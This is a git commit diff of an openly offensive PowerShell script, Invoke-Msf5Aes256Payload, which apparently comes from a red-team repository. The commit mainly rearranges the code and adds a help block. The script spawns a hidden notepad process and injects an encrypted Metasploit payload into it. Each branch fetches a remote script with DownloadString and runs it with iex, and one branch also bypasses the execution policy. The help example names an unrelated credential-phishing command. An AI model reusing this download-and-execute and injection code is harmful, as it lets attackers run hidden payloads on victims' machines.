70fa17cd46dcb702b16a108fb9901c5de9203e95
b4rtik <a.ghelli@nautilo.it>
2018-09-30 00:28:29 +0200

    fix comment

--- Scripts/Invoke-Msf5Aes256Payload.ps1
+++ Scripts/Invoke-Msf5Aes256Payload.ps1
@@ -1,28 +1,41 @@
-﻿# Written by @b4rtik
+﻿function Invoke-Msf5Aes256Payload
+{
+<#
+.SYNOPSIS
+	Based on arch parameter spawn an hidden notepad process to inject the payload
 
-####################
-#
-# Copyright (c) 2018 @b4rtik
-#
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to deal
-# in the Software without restriction, including without limitation the rights
-# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-# copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-#
-# The above copyright notice and this permission notice shall be included in all
-# copies or substantial portions of the Software.
-#
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISNG FROM,
-# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-# SOFTWARE.
-#
-####################
+.DESCRIPTION
+	Author: @b4rtik
+	License: BSD 3-Clause
+	Required Dependencies: None
+	Optional Dependencies: None
+.PARAMETER arch
+	Architecture to use for injection (Win32,x64)
+.EXAMPLE
+	C:\PS> Invoke-CredPhisher -type Office -attackerurl http://192.168.1.5/index.html
+#>
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
+        [ValidateSet("Win32","x64")]
+        [string]
+        $arch = "x64"
+          )
+    
+    switch($arch){
+        'Win32'{ 
+                write-warning 'Run Win32 notepad'
+                $procId = Run-Proc32
+                &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1'));Run-Msf5Aes256Payload -ProcessId $procId"
+            }
+        'x64'  {
+                write-warning 'Run x64 notepad'
+                iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1')) 
+                $procId = Run-Proc64
+                Run-Msf5Aes256Payload -ProcessId $procId
+            }
+    }
+}
 
 function Run-Proc32
 { 
@@ -46,29 +59,4 @@ function Run-Proc64
 
     return $Proc.id
 
-}
-
-function Invoke-Msf5Aes256Payload
-{
-    [CmdletBinding()]
-    param (
-        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
-        [ValidateSet("Win32","x64")]
-        [string]
-        $arch = "x64"
-          )
-    
-    switch($arch){
-        'Win32'{ 
-                write-warning 'Run Win32 notepad'
-                $procId = Run-Proc32
-                &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1'));Run-Msf5Aes256Payload -ProcessId $procId"
-            }
-        'x64'  {
-                write-warning 'Run x64 notepad'
-                iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1')) 
-                $procId = Run-Proc64
-                Run-Msf5Aes256Payload -ProcessId $procId
-            }
-    }
 }
